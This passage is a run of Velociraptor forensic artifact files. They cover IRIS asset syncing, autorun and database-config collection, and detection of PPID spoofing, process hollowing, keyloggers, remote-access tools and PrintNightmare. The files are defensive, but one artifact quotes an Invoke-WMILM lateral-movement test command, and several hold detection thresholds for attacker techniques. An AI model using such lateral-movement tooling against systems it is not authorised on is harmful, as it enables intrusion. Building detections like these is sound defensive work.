                    asset_ip=format(format="%v",args=[primaryIP.PrimaryIPv4Address]),
                    asset_tags=if(condition=labelToTags,then=format(format="Velo,%v",args=[labelToTags]),else="Velo"),
                    asset_description=format(format="Velo ClientId: %v\nVelo Agent First seen: %v\nAsset added to IRIS by Velo: %v\nNetwork Info:\n%v", args=[client_id,timestamp(epoch=first_seen_at),timestamp(epoch=now()),networkInterfacesDescription.NetworkInfo[0]])
                ), format="json" )

      LET apiRequestIrisAdd =
          SELECT *, if(condition=parse_json(data=Content).data.asset_id,
                    then={ SELECT addMetadata(assetIdValue=format(format="%v",
                                  args=parse_json(data=Content).data.asset_id)),
                                  label(client_id=clientId,op="set",labels="IRIS"),
                                  label(client_id=clientId,op="remove",labels="IRIS-ERROR")
                           FROM scope()},
                    else={ SELECT label(client_id=clientId,op="set",labels="IRIS-ERROR")
                           FROM scope()}) as applyLabels
          FROM http_client(
                 data=assetProperties,
                 headers=dict(
                 `Content-Type`="application/json", `Authorization`=format(format="Bearer %v",
                   args=[IrisKey])),
                 skip_verify=DisableSSLVerify,
                 root_ca=IrisRootCA,
                 method="POST",
                 url=format(format="%v/case/assets/add?cid=%v", args=[IrisURL,IrisCaseId]))

      LET apiRequestIrisGet(assetId) =
          SELECT parse_json(data=Content),
                 parse_json(data=Content).data.asset_name as asset_name,
                 parse_json(data=Content).data.asset_type_id as asset_type_id,
                 parse_json(data=Content).data.analysis_status_id as analysis_status_id,
                 parse_json(data=Content).data.asset_tags as asset_tags,
                 parse_json(data=Content).data.linked_ioc as linked_ioc,
                 parse_json(data=Content).data.custom_attributes as custom_attributes,
                 parse_json(data=Content).data.asset_compromise_status_id as asset_compromise_status_id
          FROM http_client(
                  headers=dict(
                     `Content-Type`="application/json", `Authorization`=format(format="Bearer %v",
                  args=[IrisKey])),
                  skip_verify=DisableSSLVerify,
                  root_ca=IrisRootCA,
                  method="GET",
                  url=format(format="%v/case/assets/%v?cid=%v", args=[IrisURL,assetId,IrisCaseId]))

      LET assetPropertiesUpdate = serialize(
          item=dict(
            asset_name=currentAsset.asset_name[0],
            asset_type_id=currentAsset.asset_type_id[0],
            analysis_status_id=currentAsset.analysis_status_id[0],
            asset_compromise_status_id=if(
              condition=isCompromised =~ "^Y$",
              then=1,
              else=if(
                condition=currentAsset.asset_compromise_status_id[0] = 1,
                then=1,
                else=if(
                  condition=isCompromised =~ "^N$",
                  then=2,
                  else=if(
                    condition=isCompromised =~ "^UNK$",
                    then=3,
                    else=if(
                      condition=isCompromised =~ "^TBD$",
                        then=0,
                        else=currentAsset.asset_compromise_status_id[0]))))),
            asset_tags=if(
              condition=labelToTags,
              then=format(format="Velo,%v", args=[labelToTags]),
              else="Velo")),
          format="json")

      LET apiRequestIrisUpdate(currentAsset,assetId) =
          SELECT *,
                 if(condition= Response=200,
                 then={ SELECT addMetadata(assetIdValue=format(format="%v",args=parse_json(data=Content).data.asset_id)),
                              label(client_id=clientId,op="set",labels="IRIS"),
                              label(client_id=clientId,op="remove",labels="IRIS-ERROR")
                        FROM scope()},
                 else={ SELECT label(client_id=clientId,op="set",labels="IRIS-ERROR") FROM scope()}) as applyLabels
                        FROM http_client(data=assetPropertiesUpdate,
                                         headers=dict(
                                           `Content-Type`="application/json", `Authorization`=format(format="Bearer %v",
                                             args=[IrisKey])),
                                         skip_verify=DisableSSLVerify,
                                         root_ca=IrisRootCA,
                                         method="POST",
                                         url=format(format="%v/case/assets/update/%v?cid=%v",
                                                           args=[IrisURL,assetId,IrisCaseId]))

      LET addAsset =
          SELECT { SELECT * FROM apiRequestIrisAdd } as apiRequestIrisAdd FROM clients(client_id=clientId)

      LET updateAsset =
          SELECT { SELECT * FROM apiRequestIrisUpdate(currentAsset=apiRequestIrisGet(assetId=client_metadata(client_id=clientId).IRIS_AssetId),assetId=client_metadata(client_id=clientId).IRIS_AssetId) } as apiRequestIrisUpdate
          FROM clients(client_id=clientId)


      SELECT * FROM if(condition= metadata_preparation,
        then={ SELECT
               "Already Added -> Update labels and compromise status in IRIS" AS Action,
               if(
                 condition=apiRequestIrisUpdate.Response = 200,
                 then="SUCCESS",
                 else="ERROR") AS Result,
               parse_json(
                 data=apiRequestIrisUpdate.Content).data AS AssetProperties,
               apiRequestIrisUpdate.applyLabels[0].`addMetadata(assetIdValue=format(format="%v", args=parse_json(data=Content).data.asset_id))`[0].`client_metadata(client_id=clientId)`.IRIS_AssetId AS IRIS_AssetId,
               apiRequestIrisUpdate AS _rawEvent
            FROM updateAsset
        },
        else={ SELECT
             "Needs to be added" AS Action,
             if(
               condition=apiRequestIrisAdd.Response = 200,
               then="SUCCESS",
               else="ERROR") AS Result,
             parse_json(
               data=apiRequestIrisAdd.Content).data AS AssetProperties,
             apiRequestIrisAdd.applyLabels[0].`addMetadata(assetIdValue=format(format="%v", args=parse_json(data=Content).data.asset_id))`[0].`client_metadata(client_id=clientId)`.IRIS_AssetId AS IRIS_AssetId,
             apiRequestIrisAdd AS _rawEvent
             FROM addAsset
            }
        )


---END OF FILE---

======
FILE: /content/exchange/artifacts/PSList.VTLookup.yaml
======
name: PSList.VTLookup
description: |
   Combination of PSList with Virus Total reputation lookup using the Virus Total Server Enrichment Artifact by Wes Lambert.

type: CLIENT

author: Chris Jones - CPIRT

parameters:
   - name: VTKey
     default: VTKey

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' or 'linux'

    query: |
        LET Key <= VTKey

        LET Results = SELECT Name,Pid,Ppid,Username,{
            Select Name FROM pslist(pid=Ppid)
        } AS ParentName,hash(path=Exe).SHA1 AS SHA1,
        CommandLine, Exe FROM pslist()

        SELECT *, {SELECT VTRating FROM Artifact.Server.Enrichment.Virustotal(VirustotalKey=VTKey,Hash=SHA1)} AS VTResults
        FROM foreach(row=Results)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.Autoruns.yaml
======
name: Linux.Collection.Autoruns
author: alternate
description: |
  This artifact collects various autorun files for upload.
  Based on TriagePersistence from forensicartifacts.com

reference:
  - https://github.com/ForensicArtifacts/artifacts/blob/main/data/triage.yaml

precondition: SELECT OS FROM info() WHERE OS = 'linux'

parameters:
- name: AnacronFiles
  default: |
    ["/etc/anacrontab,/etc/cron.daily/*","/etc/cron.hourly/*","/etc/cron.monthly/*",
     "/etc/cron.weekly/*","/var/spool/anacron/cron.daily","/var/spool/anacron/cron.hourly", 
     "/var/spool/anacron/cron.monthly","/var/spool/anacron/cron.weekly"]

- name: LinuxAtJobs
  default: /var/spool/at/*

- name: LinuxCronTabs
  default: |
    ["/etc/crontab","/etc/cron.d/*","/var/spool/cron"]

- name: LinuxSystemdServices
  default: |
    ["/etc/systemd/system.control/*.service","/etc/systemd/systemd.attached/*.service",
     "/etc/systemd/system/*.service","/etc/systemd/user/*.service",
     "/lib/systemd/system/*.service","/lib/systemd/user/*.service",
     "/run/systemd/generator.early/*.service","/run/systemd/generator.late/*.service",
     "/run/systemd/generator/*.service","/run/systemd/system.control/*.service",
     "/run/systemd/systemd.attached/*.service","/run/systemd/system/*.service",
     "/run/systemd/transient/*.service","/run/systemd/user/*.service",
     "/run/user/*/systemd/generator.early/*.service","/run/user/*/systemd/generator.late/*.service",
     "/run/user/*/systemd/generator/*.service","/run/user/*/systemd/transient/*.service",
     "/run/user/*/systemd/user.control/*.service","/run/user/*/systemd/user/*.service",
     "/usr/lib/systemd/system/*.service","/usr/lib/systemd/user/*.service",
     "/{root,home/*}/.config/systemd/user.control/*.service","/{root,home/*}/.config/systemd/user/*.service",
     "/{root,home/*}/.local/share/systemd/user/*.service"]

- name: LinuxSystemdTimers
  default: |
    ["/etc/systemd/system.control/*.timer","/etc/systemd/systemd.attached/*.timer",
     "/etc/systemd/system/*.timer","/etc/systemd/user/*.timer","/lib/systemd/system/*.timer",
     "/lib/systemd/user/*.timer","/run/systemd/generator.early/*.timer",
     "/run/systemd/generator.late/*.timer","/run/systemd/generator/*.timer",
     "/run/systemd/system.control/*.timer","/run/systemd/systemd.attached/*.timer",
     "/run/systemd/system/*.timer,/run/systemd/transient/*.timer","/run/systemd/user/*.timer",
     "/run/user/*/systemd/generator.early/*.timer","/run/user/*/systemd/generator.late/*.timer",
     "/run/user/*/systemd/generator/*.timer","/run/user/*/systemd/transient/*.timer",
     "/run/user/*/systemd/user.control/*.timer","/run/user/*/systemd/user/*.timer",
     "/usr/lib/systemd/system/*.timer","/usr/lib/systemd/user/*.timer",
     "/{root,home/*}/.config/systemd/user.control/*.timer",
     "/{root,home/*}/.config/systemd/user/*.timer",
     "/{root,home/*}/.local/share/systemd/user/*.timer"]

- name: LinuxSysVInit
  default: |
    ["/etc/rc.local","/etc/rc*.d","/etc/rc*.d/*","/etc/rc.d/rc*.d/*","/etc/rc.d/init.d/*"] 

- name: XDGAutostartEntries
  default: |
    ["/etc/rc.local","/etc/rc*.d","/etc/rc*.d/*","/etc/rc.d/rc*.d/*","/etc/rc.d/init.d/*"]

sources:
- name: uploadAnacronFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=AnacronFiles))

- name: uploadLinuxAtJobs
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=LinuxAtJobs)

- name: uploadLinuxSystemdServices
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxSystemdServices))

- name: uploadLinuxSystemdTimers
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxSystemdTimers))

- name: uploadLinuxSysVInit
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxSysVInit))

- name: uploadXDGAutostartEntries
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=XDGAutostartEntries))

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.ETW.DetectProcessSpoofing.yaml
======
name: Windows.ETW.DetectProcessSpoofing
description: |
      Detects Process parent spoofing such as SelectMyParent.exe or
      Cobalt Strike select PPID.

      NOTE: for short lasting processes it is expected to report NULL
      for CommandLine and Username fields as enrichment failed.

reference:
  - https://blog.f-secure.com/detecting-parent-pid-spoofing/
  - https://www.youtube.com/watch?v=DOe7WTuJ1Ac

type: CLIENT_EVENT

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET RecentProcesses = SELECT * FROM fifo(query={
            SELECT System.TimeStamp AS CreateTime,
                   EventData.ImageName AS ImageName,
                   int(int=EventData.ProcessID) AS Pid,
                   EventData.MandatoryLabel AS MandatoryLabel,
                   EventData.ProcessTokenElevationType AS ProcessTokenElevationType,
                   EventData.ProcessTokenIsElevated AS TokenIsElevated
            FROM watch_etw(guid="{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}", any=0x10)
            WHERE System.ID = 1
        }, max_rows=1000, max_age=60)

        -- Query it once to materialize the FIFO
        LET _ <= SELECT * FROM RecentProcesses

        LET GetProcessInfo(TargetPid) = SELECT * FROM switch(
        -- First try to get the pid directly
        a={
            SELECT
                Name, Pid, CreateTime,
                Exe as ImageName,
                CommandLine,
                Username,
                TokenIsElevated
            FROM pslist(pid=TargetPid)
        },
        -- Failing this look in the FIFO for a recently started process.
        b={
            SELECT
                basename(path=ImageName) as Name,
                Pid,
                CreateTime,
                ImageName,
                Null as CommandLine,
                Null as Username,
                if(condition= TokenIsElevated="0",
                    then= false,
                    else= true ) as TokenIsElevated
            FROM RecentProcesses
            WHERE Pid = TargetPid
            LIMIT 1
        })

        -- Resolve parent pid from the fifo - this allows us to catch fast terminating processes.
        SELECT System.TimeStamp AS EventTime,
            GetProcessInfo(TargetPid=int(int=EventData.ProcessID))[0] AS SuspiciousProcess,
            GetProcessInfo(TargetPid=System.ProcessID)[0] AS RealParent,
            GetProcessInfo(TargetPid=int(int=EventData.ParentProcessID))[0] AS ClaimedParent,
            System as _System, EventData as _EventData
        FROM watch_etw(guid="{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}", any=0x10)
        WHERE System.ID = 1 AND str(str=System.ProcessID) != EventData.ParentProcessID

---END OF FILE---

======
FILE: /content/exchange/artifacts/HollowsHunter.yaml
======
name: Windows.Memory.HollowsHunter
description: |
   Use hollows_hunter to detect suspicious process injections.

   Upload any findings to the server, including process dumps.

tools:
 - name: hollows_hunter
   github_project: hasherezade/hollows_hunter
   github_asset_regex: hollows_hunter64.exe
   serve_locally: true

precondition:
   SELECT OS From info() where OS = 'windows'
   
sources:
  - name: Output
    query: |
      -- Get the path to the hollows_hunter tool and a fresh temp directory.\
      LET TempDir <= tempdir(remove_last=TRUE)
      LET binaries <= SELECT FullPath
      FROM Artifact.Generic.Utils.FetchBinary(ToolName="hollows_hunter")

      -- Run the tool and relay back the output, as well as upload all the files from the tempdir.
      SELECT *
      FROM execve(argv=[binaries[0].FullPath,"/hooks",
           "/json", "/dir", TempDir], sep="\n")
           
  - name: Summary
    query: |
      LET LookupPid(pid) = SELECT Name, CommandLine, Exe FROM pslist(pid=pid)

      SELECT *, LookupPid(pid=pid)[0] AS ProcessInfo
      FROM foreach(row=parse_json(
            data=read_file(filename=TempDir + "/summary.json")).suspicious)  
            
  - name: Uploads
    query: |
      SELECT upload(file=FullPath) AS Upload
      FROM glob(globs="*", root=TempDir)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.DBConfig.yaml
======
name: Linux.Collection.DBConfig
author: alternate
description: |
  Collect database configurations and upload them.
  Based on TriageDatabaseConfigsAndLogs from forensicartifacts.com

reference:
  - https://github.com/ForensicArtifacts/artifacts/blob/main/data/triage.yaml

precondition: SELECT OS FROM info() WHERE OS = "linux"

parameters:
- name: MongoDBConfigurationFile
  default: |
    ["/usr/local/etc/mongod.conf", "/opt/homebrew/etc/mongod.conf", "/etc/mongod.conf"]

- name: MongoDBLogFiles
  default: /var/log/mongodb/mongod.log*

- name: MySQLConfigurationFiles
  default: |
    ["/etc/my.cnf", "/etc/mysql/mysql.conf.d/mysqld.cnf"]

- name: MySQLLogFiles
  default: |
    ["/var/log/mysql.log*", "/var/log/mysql/error.log*"]

- name: OpenSearchLogFiles
  default: |
    ["/var/log/opensearch/*.json", "/var/log/opensearch/*.log"]

- name: PostgreSQLConfigurationFiles
  default: |
    ["/etc/postgresql/*/*/pg_ident.conf", "/var/lib/pgsql/pg_hba.conf", "/var/lib/pgsql/data/pg_ident.conf", 
     "/etc/postgresql/*/*/postgresql.conf", "/var/lib/pgsql/pg_ident.conf", "/var/lib/pgsql/data/postgresql.conf", 
     "/etc/postgresql/*/*/pg_hba.conf", "/var/lib/pgsql/data/pg_hba.conf", "/var/lib/pgsql/postgresql.conf"]

- name: PostgreSQLLogFiles
  default: |
    ["/var/log/postgresql/postgresql-*.log*", "/var/lib/pgsql/data/log/postgresql.csv*",
     "/var/log/postgresql/postgresql.csv*", "/var/log/postgresql/postgresql-*-*.csv*",
     "/var/log/postgresql/postgresql-*-*.log*", "/var/lib/pgsql/data/log/postgresql-*-*.csv*",
     "/var/log/postgresql/postgresql-*.csv*", "/var/lib/pgsql/data/log/postgresql-*-*.log*",
     "/var/lib/pgsql/data/log/postgresql-*.csv*", "/var/log/postgresql/postgresql.log*",
     "/var/lib/pgsql/data/log/postgresql.log*", "/var/lib/pgsql/data/log/postgresql-*.log*"]

- name: RedisConfigFile
  default: |
    ["/etc/redis/redis.conf", "/private/etc/redis/redis.conf"]

- name: RedisConfigurationFile
  default: |
    ["/etc/init.d/redis_*", "/etc/redis/*"]

- name: RedisLogFiles
  default: |
    ["/var/log/redis/redis*.log*", "/var/log/redis*.log*"]

sources:
- name: uploadMongoDBConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=MongoDBConfigurationFile))

- name: uploadMongoDBLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=MongoDBLogFiles)

- name: uploadMySQLConfigurationFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=MySQLConfigurationFiles))

- name: uploadMySQLLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=MySQLLogFiles))

- name: uploadOpenSearchLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=OpenSearchLogFiles))

- name: uploadPostgreSQLConfigurationFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=PostgreSQLConfigurationFiles))

- name: uploadPostgreSQLLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=PostgreSQLLogFiles))

- name: uploadRedisConfigFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=RedisConfigFile))

- name: uploadRedisConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=RedisConfigurationFile))

- name: uploadRedisLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=RedisLogFiles))

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.System.WMIProviders.yaml
======
name: Windows.System.WMIProviders
description: |
   List the WMI providers in the system.
   
   It is possible to laterally move by installing a fake provider in the system, and then calling
   it remotely. This artifact enumerates all WMI providers and recovers the binary that runs when 
   loaded.
   
   Test using https://github.com/Cybereason/Invoke-WMILM (Will run as SYSTEM)
   ```
   Invoke-WMILM -Target localhost -Type Provider -Name notepad -Username test -Password test -Command notepad.exe
   ```
   
reference:
  - https://www.cybereason.com/blog/wmi-lateral-movement-win32

type: CLIENT

parameters:
   - name: BinaryIncludeRegex
     default: .
     type: regex 
   - name: BinaryExcludeRegex
     type: regex
   - name: ServerTypeRegex
     type: regex 
     description: Only show these WMI provider types (e.g. LocalServer)

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET Hits = SELECT CLSID, Name, {
            SELECT Data.value AS Binary, basename(path=dirname(path=FullPath)) AS ServerType
            FROM glob(globs="/*Server*/@", root='''HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\''' + CLSID, accessor="reg")
            WHERE CLSID
            limit 1
        } AS Details
        FROM wmi(query="Select * from __Win32Provider ")
        
        SELECT CLSID, Name, Details.ServerType AS ServerType, Details.Binary AS BinaryPath
        FROM Hits
        WHERE ServerType =~ ServerTypeRegex
          AND BinaryPath =~ BinaryIncludeRegex
          AND if(condition=BinaryExcludeRegex,
            then=NOT BinaryPath =~ BinaryExcludeRegex,
            else=TRUE)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Applications.AnyDesk.yaml
======
name: Windows.Applications.AnyDesk
description: |
   This parses AnyDesk logs to retrieve information about AnyDesk usage. It includes source IP addresses, AnyDesk ID's, and filetransfers.

   Parts of below code was used from Matt Green - @mgreen27

author: Jos Clephas - @DfirJos

reference:
  - https://attack.mitre.org/techniques/T1219/


type: CLIENT
parameters:
  - name: DateAfter
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ss Z"
    type: timestamp
  - name: DateBefore
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ss Z"
    type: timestamp
  - name: SearchVSS
    description: "Add VSS into query."
    type: bool
  - name: MessageRegex
    description: "Keyword search using regex, for example: IP address, AnyDesk ID's"
    default: .
  - name: SearchFilesGlobTable
    type: csv
    default: |
      Glob
      C:\Users\*\AppData\Roaming\AnyDesk\ad_*\ad*.trace
      C:\Users\*\AppData\Roaming\AnyDesk\ad*.trace
      C:\ProgramData\AnyDesk\ad*.trace
  - name: OutputAll
    type: bool
    description: "By default it only shows events concerning IP addresses, AnyDeskID's and source hostnames. By selecting this it outputs all events."
    default: FALSE

sources:
  - query: |
      -- Build time bounds
      LET DateAfterTime <= if(condition=DateAfter,
        then=DateAfter, else="1600-01-01")
      LET DateBeforeTime <= if(condition=DateBefore,
        then=DateBefore, else="2200-01-01")

      LET fspaths <= SELECT OSPath FROM glob(globs=SearchFilesGlobTable.Glob)

      -- function returning list of VSS paths corresponding to path
      LET vsspaths(path) = SELECT OSPath
        FROM Artifact.Windows.Search.VSS(SearchFilesGlob=path)

      LET parse_log(OSPath) = SELECT parse_string_with_regex(
            string=Line,
            regex="^[\\s\\w]+?" + 
              "(?P<Timestamp>[\\d]{4}-[\\d]{2}-[\\d]{2}\\s[\\d]{2}:[\\d]{2}:[\\d]{2}.[\\d]{3})" +
              "\\s+\\w+\\s+" +
              "(?P<PPID>\\d+)\\s+" +
              "(?P<PID>\\d+)[\\s\\w]+" +
              "(?P<Type>.+)[ ][-][ ]" +
              "(?P<Message>" +
                "(Incoming session request: (?P<ComputerName>.+)[ ][(](?P<AnyDeskID>\\d+).)?" +
                "(Logged in from (?P<LoggedInFromIP>[\\d.]+):(?P<Port>\\d+))?" +
                "(?P<SessionStopped>Session stopped)?" +
                "(Preparing files in ['](?P<PotentialFileTransfer>.+)['].+)?" +
                "(External address: (?P<ExternalAddress>[\\d.]+):)?" + 
                ".+$)"
              ) as Record,OSPath
        FROM parse_lines(filename=OSPath) 

      -- function returning IOC hits
      LET logsearch(PathList) = SELECT * FROM foreach(
            row=PathList,
            query={
               SELECT *,timestamp(epoch=Record.Timestamp,format="2006-01-02 15:04:05") AS Timestamp
               FROM parse_log(OSPath=OSPath)
               WHERE Timestamp < DateBeforeTime AND
                     Timestamp > DateAfterTime AND 
                     Record.Message =~ MessageRegex AND 
                     if(condition=OutputAll, then=TRUE, else= Record.ComputerName OR
                                                            Record.LoggedInFromIP OR
                                                            Record.PotentialFileTransfer OR
                                                            Record.SessionStopped OR
                                                            Record.AnyDeskID OR
                                                            Record.ExternalAddress)     
               }) 

      -- include VSS in calculation and deduplicate with GROUP BY by file
      LET include_vss = SELECT * FROM foreach(row=fspaths,
            query={
                SELECT *
                FROM logsearch(PathList={
                        SELECT OSPath FROM vsspaths(path=OSPath)
                    })
                GROUP BY Record
              })

      -- exclude VSS in logsearch`
      LET exclude_vss = SELECT * FROM logsearch(PathList={SELECT OSPath FROM fspaths})

      -- return rows
      SELECT Timestamp,
             Record.Message as Message,
             Record.ComputerName as ComputerName,
             Record.LoggedInFromIP as LoggedInFromIP,
             Record.PotentialFileTransfer as PotentialFileTransfer,
             Record.AnyDeskID as AnyDeskID,
             Record.ExternalAddress as ExternalAddress,
             OSPath
      FROM if(condition=SearchVSS,
            then=include_vss,
            else=exclude_vss)

---END OF FILE---

======
FILE: /content/exchange/artifacts/AteraNetworks.yaml
======
name: Windows.Registry.AteraNetworks
description: |
    Find AteraNetworks configuration details in the registry.
    This artifact is best combined with Windows.Forensics.FilenameSearch 
    searching for the string "atera".

author: original author Eduardo Mattos - @eduardfir

reference:
  - https://www.advanced-intel.com/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent
  
precondition:
  SELECT * FROM info() where OS = 'windows'

parameters:
  - name: SearchRegistryGlob
    default: \HKEY_LOCAL_MACHINE\SOFTWARE\ATERA Networks\AlphaAgent\**
    description: Use a glob to define the registry hives that will be searched.

sources:
  - query: |
        SELECT  ModTime as LastModified,
                FullPath,
                Name as KeyName,
                Data.value as KeyValue,
                Data.type as KeyType
        FROM glob(globs=SearchRegistryGlob, accessor='registry')
        WHERE NOT Data.type = 'key'

column_types:
  - name: Modified
    type: timestamp

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Detection.Keylogger.yaml
======
name: Windows.Detection.Keylogger
author: Zane Gittins
description: |
   This artifact is my attempt at implementing keylogger detection based on research presented by [Asuka Nakajima at NULLCON](https://speakerdeck.com/asuna_jp/nullcon-goa-2025-windows-keylogger-detection-targeting-past-and-present-keylogging-techniques) using the Microsoft-Windows-Win32k ETW provider.
   
   * Polling based keyloggers - Event id 1003 (GetAsyncKeyState) with MsSinceLastKeyEvent > 100 and BackgroundCallCount > 400
   * Hooking based keyloggers - Event id 1002 (SetWindowsHookEx) with FilterType = WH_KEYBOARD_LL
   * RawInput based keyloggers - Event id 1001 (RegisterRawInputDevices) with Flags = RIDEV_INPUT_SINK
# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT or NOTEBOOK
type: CLIENT_EVENT

parameters:
  - name: ProcessExceptionsRegex
    description: Except these processes.
    type: string
    default: "Explorer.exe"
export: |
   LET SuspiciousEvents = SELECT *
     FROM delay(query={
       SELECT *
       FROM watch_etw(guid="{8c416c79-d49b-4f01-a467-e56d3aa8234c}",
                      description="Microsoft-Windows-Win32k",
                      level=4,
                      any=5120)
       WHERE (System.ID = 1003
          AND atoi(string=EventData.MsSinceLastKeyEvent) > 100
               AND atoi(string=EventData.BackgroundCallCount) > 400) OR (
           System.ID = 1002
          AND EventData.FilterType = "0xD") OR (System.ID = 1001
          AND EventData.Flags = "256")
     },
                delay=5)
   
   // On event id 1003 we must use EventData.PID as the process PID not System.ID.
   LET EnrichEvents = SELECT *
     FROM foreach(row=SuspiciousEvents,
                  query={
       SELECT *
       FROM if(condition=System.ID = 1003,
               then={
       SELECT timestamp(string=System.TimeStamp) AS Timestamp,
              System.ID AS EventID,
              EventData.PID AS Pid,
              process_tracker_get(id=atoi(string=EventData.PID)).Data AS ProcInfo,
              join(array=process_tracker_callchain(
                      id=atoi(string=EventData.PID)).Data.Name,
                    sep="->") AS CallChain
       FROM scope()
     },
               else={
       SELECT timestamp(string=System.TimeStamp) AS Timestamp,
              System.ID AS EventID,
              System.ProcessID AS Pid,
              process_tracker_get(id=System.ProcessID).Data AS ProcInfo,
              join(array=process_tracker_callchain(
                      id=System.ProcessID).Data.Name,
                    sep="->") AS CallChain
       FROM scope()
     })
     })
     WHERE NOT ProcInfo.Exe =~ ProcessExceptionsRegex


sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' AND version(plugin="dedup") >= 0

    query: |
       SELECT *
       FROM dedup(query={ SELECT * FROM EnrichEvents }, timeout=5, key="Pid")


  - precondition:
      SELECT OS From info() where OS = 'windows' AND version(plugin="dedup") = NULL

    query: |
       SELECT *
       FROM EnrichEvents

---END OF FILE---

======
FILE: /content/exchange/artifacts/PrintNightmareMonitor.yaml
======
name: Windows.Monitoring.PrintNightmare
author: Matt Green - @mgreen27
description: |
  This artifact returns ETW PrintService events for potential
  PrintNightmare activity.  CVE-2021-1675 and CVE-2021-34527

  It monitors for DRIVER_ADDED events and enriches with binary
  information for payload DataFile. Hunt for unexpected drivers with
  malicious DataFiles.

type: CLIENT_EVENT
sources:
  - query: |
      -- Monitor ETW provider and extract enriched target events
      LET hits = SELECT
            System.TimeStamp AS EventTime,
            "Microsoft-Windows-PrintService" as Provider,
            System.ID as EventId,
            'DRIVER_ADDED' as Action,
            EventData,
            {
                SELECT
                    split(string=Name, sep=',')[0] as Name,
                    SupportedPlatform,
                    Version,
                    DriverPath,
                    ConfigFile,
                    DataFile
                  FROM wmi(query='SELECT * FROM Win32_PrinterDriver',namespace='root/CIMV2')
                  WHERE Name = EventData.param1
            } as DriverInformation
        FROM watch_etw(guid="{747EF6FD-E535-4D16-B510-42C90F6873A1}",
            name=format(format="Velociraptor-%v-PrintService", args=now()))
        WHERE EventId = 316

      -- output rows and final binary enrichment
      SELECT
        EventTime,
        Provider,
        EventId,
        Action,
        EventData.param1 as Name,
        EventData.param2 as Platform,
        DriverInformation.Version as Version,
        if(condition=DriverInformation,
            then= dict(
                DriverPath=DriverInformation.DriverPath,
                ConfigFile=DriverInformation.ConfigFile,
                DataFile=DriverInformation.DataFile),
            else= EventData.param4) as Files,
        hash(path=DriverInformation.DataFile) as DataFileHash,
        parse_pe(file=DriverInformation.DataFile) as DataFilePE,
        authenticode(filename=DriverInformation.DataFile) as DataFileAuthenticode
      FROM hits

---END OF FILE---

======
FILE: /content/exchange/artifacts/RecordIDCheck.yaml
======
name: Windows.EventLogs.RecordIDCheck
author: Matt Green - @mgreen27
description: |
  This artifact will compare EventLog records and report on
  abnormalities in RecordID sequence and optional time gap. The
  artifact can be used for both hunting, remote or local analysis.

  There are several parameter's available.
    - EvtxGlob glob of EventLogs to target. Default to all but can be targeted.
    - PathRegex enables filtering on evtx path for specific log targetting.
    - DateAfter enables search for events after this date.
    - DateBefore enables search for events before this date.
    - MaxTimeDifference enables flaging temporal gaps between Events. Note also potential false positives on machines turned off.
    - SearchVSS enables searching over VSS

  Note: Please use with caution this artifact can potentially be heavy
  on the endpoint.  Temporal analysis is turned off by default due to
  potential for false positives during machine shutdown. Sequential
  false positives may also occur very occasionally.

  version: 0.6.1

parameters:
  - name: EvtxGlob
    description: Target glob to process for abnormalities.
    default: '%SystemRoot%\System32\Winevt\Logs\*.evtx'
  - name: PathRegex
    description: Event log Regex to enable filtering on path
    default: .
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: MaxTimeDifference
    description: Alert on events with a gap between previous event greater than this number in seconds.
  - name: SearchVSS
    description: "Add VSS into query."
    type: bool

sources:
  - query: |
      -- time testing
      LET time_test(stamp) =
            if(condition= DateBefore AND DateAfter,
                then= stamp < DateBefore AND stamp > DateAfter,
                else=
            if(condition=DateBefore,
                then= stamp < DateBefore,
                else=
            if(condition= DateAfter,
                then= stamp > DateAfter,
                else= True
            )))

